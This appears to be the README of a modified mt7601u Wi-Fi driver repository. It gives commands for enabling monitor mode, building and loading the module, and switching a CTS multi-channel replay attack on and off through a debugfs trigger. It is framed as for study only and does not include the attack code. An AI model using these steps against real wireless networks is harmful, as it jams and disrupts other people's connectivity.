# mt7601u_attackdriver
net attack by mt7601u driver
for study ONLY

一.CTS多信道重放攻击

1.开启监听模式：
    ip link set <dev> down
    iw dev <dev> set type monitor
    ip link set <dev> up

2.编译生成ko（可能需要改trace路径）
    make

3.移除Linux原生驱动并进入文件夹安装该驱动
    modprobe -r mt7601u
    modprobe mac80211
    insmod mt7601u.ko

4.进入/sys/kernel/debug/ieee80211/mt7601u调用接口开始攻击
    echo 1 > attack_trigger //开启
    echo 0 > attack_trigger //关闭